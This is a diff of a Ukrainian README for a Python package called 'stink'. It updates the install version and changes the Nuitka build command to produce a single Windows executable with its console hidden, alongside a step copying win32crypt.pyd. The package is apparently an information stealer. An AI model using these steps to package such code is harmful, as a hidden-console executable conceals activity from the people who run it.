@@ -39,7 +39,7 @@
 
 Встановити останню версію можна командою:
 ```
-pip install stink==0.0.7
+pip install stink==0.0.8
 ```
 
 ## Приклад використання
@@ -121,14 +121,14 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.7
+pip install stink==0.0.8
 ```
 6. У створеній папці venv переходимо по шляху `\Lib\site-packages\win32\`.
 7. Копіюємо файл `win32crypt.pyd`.
 8. Вставляємо по шляху `\Lib\site-packages\`.
 9. Повертаємося до `cmd` і прописуємо команду:
 ```
-nuitka --onefile --include-package=stink test.py
+nuitka --onefile --windows-disable-console --include-package=stink test.py
 ```
 
-Після виконання команди отримуємо test.exe файл.
+Після виконання команди отримуємо test.exe файл із прихованою консоллю.
